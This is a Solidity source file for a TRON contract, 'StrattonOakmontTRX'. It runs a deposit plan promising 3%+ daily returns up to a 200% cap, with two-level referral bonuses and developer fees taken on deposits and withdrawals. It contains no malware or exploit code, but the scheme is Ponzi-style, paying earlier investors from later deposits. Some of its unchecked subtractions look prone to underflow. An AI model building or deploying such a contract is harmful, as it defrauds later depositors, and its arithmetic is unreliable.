//SourceUnit: stratton-oakmont.sol

pragma solidity 0.5.8;



contract StrattonOakmontTRX {
    // -- Investor -- //
    struct AttonPlan {
        uint256 activeDeposit;
        uint256 recordDeposit;
        uint256 dividends; 
        uint256 dividendsT;
        uint256 depositsCount;
        uint256 withdrawn;
        uint256 withdrawnR;
    }  
    
   
  
    struct Player {
        // Atton Plan
        AttonPlan[1] attonPlan;
        
     
        
        // General
        address upline;        
        uint256 direct_bonus;
        uint256 match_bonus;
        uint256 last_payout;
        uint256 total_withdrawn;
        uint256 total_reinvested;
        uint256 total_withdrawnReferral;
        uint256 total_match_bonus;
        uint256 total_direct_bonus;
        uint256 total_invested;
        uint256 firstDep_Time;
        uint8   withdrawOption;
        mapping(uint8 => uint256) structure;
    }
    // -- Investor -- //
    
    // Atton Plan
    uint256 private attonDeposit_StartTime;
    uint40 private attonDeposit_TimeToStart;
    uint40 private min_AttonInvest;
    uint40 private max_AttonInvest;
    uint40 private min_AttonWithdraw;  
    uint256 private attonPlanDeposit_StartTime;
    
   
    
    // General
    address payable private developer;
    uint256 private contract_CreateTime;
    uint256 private contract_StartTime;
    uint40  private contract_TimeToStart; 
    uint8   private defaultwithdrawOption;
    uint256 private invested;
    uint256 private investors;
    uint256 private totalWithdrawn;
    uint256 private totalWithdrawnReferral;
    uint256 private direct_bonus;
    uint256 private match_bonus;
    uint256 private maintenance_fee;
    uint256 private advertising_fee;
    uint256 private attonDepositCount;
    uint256 private ContractBalance;
    uint256 private cancelCount;
    uint256 private cancelRetPercent;
    uint8[] private ref_bonuses;
    mapping(address => Player) private players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor() public {
        developer = msg.sender;
        contract_CreateTime = 0;
        contract_TimeToStart = 1603231200;
        contract_StartTime = contract_CreateTime + contract_TimeToStart;
        maintenance_fee = 5;
        advertising_fee = 5;
        defaultwithdrawOption = 10;
        cancelRetPercent = 85;
        ref_bonuses.push(6);
        ref_bonuses.push(2);  
        
        // Atton Plan
        attonDeposit_TimeToStart = 1602961200;
        attonDeposit_StartTime = contract_CreateTime + attonDeposit_TimeToStart;
        min_AttonInvest = 100E6; 
        max_AttonInvest = 1000000E6;
        min_AttonWithdraw = 20E6;  
        
      
    }
    
    modifier onlyDeveloper {
        require(msg.sender == developer);
        _;
    }   
    
    function cancelContract() external {
        uint256 retriveAmountTotal = getRetriveAmountT(msg.sender, cancelRetPercent);
        require(retriveAmountTotal > 0, "Earnings exceed deposited funds");
       
        uint contractBalance = address(this).balance;
        if (contractBalance > retriveAmountTotal) {
          resetPlayerStatistics(msg.sender);
          totalWithdrawn += retriveAmountTotal;
          totalWithdrawnReferral += getRetriveAmountR(msg.sender);
          cancelCount++;
          investors--;
          msg.sender.transfer(retriveAmountTotal);  
          payOwnerMaintenanceFee(retriveAmountTotal); 
        }
    } 
    
   function getRetriveAmountT(address _addr, uint256 rt) private view returns(uint256) {
       return (getRetriveAmountIL(_addr) * rt / 100) + (getRetriveAmountR(_addr));   
   }
   
   function getRetriveAmountIL(address _addr) private view returns(uint256) {
       Player storage player = players[_addr];
       uint256 a = player.attonPlan[0].recordDeposit;
       uint256 b = player.attonPlan[0].withdrawnR;
       return minZero(a, b);
   }

   function getRetriveAmountR(address _addr) private view returns(uint256) {
       Player storage player = players[_addr];
       return (player.match_bonus + player.direct_bonus);
   }   
    
    function resetPlayerStatistics(address _addr) private {
        Player storage player = players[_addr];  
        player.attonPlan[0].activeDeposit = 0;
        player.attonPlan[0].recordDeposit = 0;
        player.attonPlan[0].dividends = 0;
        player.attonPlan[0].depositsCount = 0;
        player.attonPlan[0].withdrawn = 0;
        player.attonPlan[0].withdrawnR = 0;  
       
        player.withdrawOption = 0;
        player.direct_bonus = 0;
        player.match_bonus = 0;
        player.last_payout = now;
        player.total_withdrawn = 0;
        player.total_reinvested = 0;
        player.total_withdrawnReferral = 0;
        player.total_match_bonus = 0; 
        player.total_direct_bonus = 0; 
        player.total_invested = 0; 
        player.firstDep_Time = 0;
        player.upline = address(0);
    }    
  
    function refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / 100;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != developer) {
             if(players[_upline].attonPlan[0].activeDeposit == 0) {
                 _upline = developer;
             }
             else {
                 players[_addr].direct_bonus += _amount * 1 / 100;
                 players[_addr].total_direct_bonus += _amount * 1 / 100;
                 direct_bonus += _amount * 1 / 100;
             }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount * 1 / 100);
            
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }

   
    
    function attonDeposit(address _upline) external payable {
        Player storage player = players[msg.sender];
        
        require(now >= attonDeposit_StartTime, "Atton Plan is not available yet");
        require(msg.value >= min_AttonInvest, "Minimum to invest is 100 TRX");
        require(msg.value <= max_AttonInvest, "Maximum to invest is 1 000 000 TRX");
    
        setUpline(msg.sender, _upline, msg.value);

        if (player.attonPlan[0].depositsCount == 0) {
            player.firstDep_Time = now;
            if (contract_StartTime > now) {
               player.last_payout = contract_StartTime;   
            } else {
               player.last_payout = now;   
            }
            investors++;
           
        } else {
            update_AttonPlanInterestProfit(msg.sender);
        }

        player.attonPlan[0].depositsCount++;
        attonDepositCount ++;
        invested += msg.value;
        player.attonPlan[0].activeDeposit += msg.value;
        player.attonPlan[0].recordDeposit += msg.value;
        player.total_invested += msg.value;

        payOwnerAdvertisingFee(msg.value);
       
        refPayout(msg.sender, msg.value);
        
        emit NewDeposit(msg.sender, msg.value);
    }
    
      
    
    function update_AttonPlanInterestProfit(address _addr) private {
        Player storage player = players[_addr];
        uint256 amount = getAttonPlan_InterestProfit(_addr);
        if(amount > 0) {
            player.attonPlan[0].dividends += amount;


             if ( player.attonPlan[0].dividends >= (player.attonPlan[0].recordDeposit * 2)-player.total_withdrawn) {
                  player.attonPlan[0].dividends = (player.attonPlan[0].recordDeposit * 2)-player.total_withdrawn; 
               }   
           
            player.last_payout = now;
        }
    }   
    
    function attonWithdraw() external {
        Player storage player = players[msg.sender];
       
        
        update_AttonPlanInterestProfit(msg.sender);
        uint256 amount = player.attonPlan[0].dividends;
        
    
              if ( player.attonPlan[0].dividends >= (player.attonPlan[0].recordDeposit * 2)-player.total_withdrawn) {
               uint256 wAmount = (player.attonPlan[0].recordDeposit * 2)-player.total_withdrawn; 
               amount = wAmount;


              player.attonPlan[0].activeDeposit = 0;
             

           }



        require(amount >= min_AttonWithdraw, "Minimum Withdraw is 20 TRX");
       

        player.total_withdrawn += amount;
        player.attonPlan[0].withdrawn += amount;
        player.attonPlan[0].withdrawnR += amount;

         if ( player.attonPlan[0].activeDeposit == 0)  {
             
                 player.attonPlan[0].recordDeposit = 0;
                 player.attonPlan[0].dividends = 0;
                 player.attonPlan[0].depositsCount = 0;
                 player.attonPlan[0].withdrawn = 0;
                 player.attonPlan[0].withdrawnR = 0;  
       
                 player.withdrawOption = 0;
                 player.last_payout = now;
                 player.total_withdrawn = 0;
                 player.total_reinvested = 0;
                 player.total_invested = 0; 
                 player.firstDep_Time = 0;

           
        }



        totalWithdrawn += amount;
   
     


        player.attonPlan[0].dividends = 0; 

        msg.sender.transfer(amount);
        payOwnerMaintenanceFee(amount);
        emit Withdraw(msg.sender, amount);
    }
    
    
   
    
    function referralWithdraw() external {
        Player storage player = players[msg.sender];
        uint contractBalance = address(this).balance;
        require(player.attonPlan[0].depositsCount > 0, "Active deposit is require");
        require(contractBalance >= player.match_bonus + player.direct_bonus, "Contract balance < Referral bonus");

        uint256 amount = player.match_bonus + player.direct_bonus;
        player.match_bonus = 0;
        player.direct_bonus = 0;

        player.total_withdrawn += amount;
        player.total_withdrawnReferral += amount;
        totalWithdrawnReferral += amount;
        totalWithdrawn += amount;

        msg.sender.transfer(amount);
        payOwnerMaintenanceFee(amount);
        emit Withdraw(msg.sender, amount);
    }    
    
   
    
    function attonReinvest() external {
        Player storage player = players[msg.sender];
        require(player.attonPlan[0].activeDeposit >= min_AttonInvest, "Atton Deposit is require first");
        update_AttonPlanInterestProfit(msg.sender);
        uint256 reinvestAmount = player.attonPlan[0].dividends;
        player.attonPlan[0].dividends = 0;
        player.attonPlan[0].activeDeposit += reinvestAmount; 
        player.total_reinvested += reinvestAmount; 
    } 
    
    function allReinvest() external {
        Player storage player = players[msg.sender];
        require(player.attonPlan[0].activeDeposit >= min_AttonInvest, "Atton Deposit is require first");
        update_AttonPlanInterestProfit(msg.sender);
        uint256 reinvestAmount = player.attonPlan[0].dividends + player.match_bonus + player.direct_bonus;
        player.attonPlan[0].dividends = 0;
        player.match_bonus = 0;
        player.direct_bonus = 0;
        player.attonPlan[0].activeDeposit += reinvestAmount;
        player.total_reinvested += reinvestAmount;
    }    
    
    function getAttonPlan_InterestProfit(address _addr) view private returns(uint256 value) {
        Player storage player = players[_addr];
        uint256 fr = player.last_payout;
        if (contract_StartTime > now) {
          fr = now; 
        }
       
        uint256 to = now;
        uint256 Roi = ROI();
      
        if(fr < to) {
            value = player.attonPlan[0].recordDeposit * (to - fr) * (Roi) / 86400 / 100E6;

                  if (  value >= (player.attonPlan[0].recordDeposit * 2) - player.attonPlan[0].dividends - player.total_withdrawn) {
                         value = (player.attonPlan[0].recordDeposit * 2) - player.attonPlan[0].dividends - player.total_withdrawn;
                     }
        } else {
            value = 0;
        }
        return value;
    }
   
        

   
          function getContractBalanceRate() public view returns(uint256){
   
            uint256 ContractBalance = address(this).balance;

            uint256 ContractPercentRate = ContractBalance/1000000000000;


	         if (ContractPercentRate >= 50){ 
		      ContractPercentRate = 50;
		}
            return ContractPercentRate; 


            }
    
    
    function ROI() public view returns (uint256) { 
	
                uint256 PercentRate = getContractBalanceRate();
		
                 uint256 Roi = 3000000 + PercentRate * (100000); //Roi from 3%
    
    return Roi;

     }


    function activeAttonInvest(address _addr) external view onlyDeveloper returns(uint256) {
        Player storage player = players[_addr];
        uint256 value = player.attonPlan[0].activeDeposit;
        return value;
    }
    
    

    function payOwnerMaintenanceFee(uint256 val) private {
        uint256 amount_maintenance = (val * maintenance_fee) / 100;
        developer.transfer(amount_maintenance);
    }
    
    function payOwnerAdvertisingFee(uint256 val) private {
        uint256 amount_advertising = (val * advertising_fee) / 100;
        developer.transfer(amount_advertising);
    } 
    
    function minZero(uint256 a, uint256 b) private pure returns(uint256) {
        if (a > b) {
           return a - b; 
        } else {
           return 0;    
        }    
    }    
    
   function userGeneralInfo(address _addr) view external returns(uint256 _totalInvested, uint256 _totalReinvested, uint256 _totalWithdrawn, uint256 _total_WithdrawnReferral, 
                                                                  uint256 _totalMatchBonus, uint256 _totalDirectBonus,  uint256 _matchBonus, uint256 _directBonus, 
                                                                  uint256 _withdrawOption, uint256 _runningTime, uint256[3] memory _structure) {
        Player storage player = players[_addr];
        
        uint256 runningTime = 0;
        if (player.total_invested > 0) {
         runningTime = now - player.firstDep_Time;
        }
        
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            _structure[i] = player.structure[i];
        }
        return (
            player.total_invested,
            player.total_reinvested,
            player.total_withdrawn,
            player.total_withdrawnReferral,
            player.total_match_bonus,
            player.total_direct_bonus,
            player.match_bonus,
            player.direct_bonus,
            player.withdrawOption,
            runningTime,
            _structure
        );    
    } 
    
    function usercancelContractInfo(address _addr) view external returns(uint256 _cancelRetAmountIL, uint256 _cancelRetAmountR, uint256 _cancelRetAmountT) {
        return (
            getRetriveAmountT(_addr, cancelRetPercent) - getRetriveAmountR(_addr),
            getRetriveAmountR(_addr),
            getRetriveAmountT(_addr, cancelRetPercent)
        );    
    }    
    
    function userAttonPlanInfo(address _addr) view external returns(uint256 _activeDeposit, uint256 _recordDeposit, uint256 _dividends, uint256 _depositsCount, uint256 _withdrawn) {
        Player storage player = players[_addr];
       

              


        return (
            player.attonPlan[0].activeDeposit,
            player.attonPlan[0].recordDeposit,
            player.attonPlan[0].dividends + getAttonPlan_InterestProfit(_addr),
            player.attonPlan[0].depositsCount,
            player.attonPlan[0].withdrawn
        );  
    }    
    
    
    function contractInfo() view external returns(uint256 _invested, uint256 _investors, uint256 _matchBonus, uint256 _attonDepositCount, uint256 _ContractBalance, 
                                                  uint256 _contractStartTime, uint256 _contractIniTime, uint256 _AttonPDepIniTime, uint256 _attonDepIniTime) {
        
            uint256 ContractBalance = address(this).balance;
    return (
            invested,
            investors,
            match_bonus,
            attonDepositCount,
            ContractBalance,
            contract_StartTime,
            minZero(contract_StartTime, now),
            minZero(attonDeposit_StartTime, now),
            minZero(attonPlanDeposit_StartTime, now)
        );
     
    }
}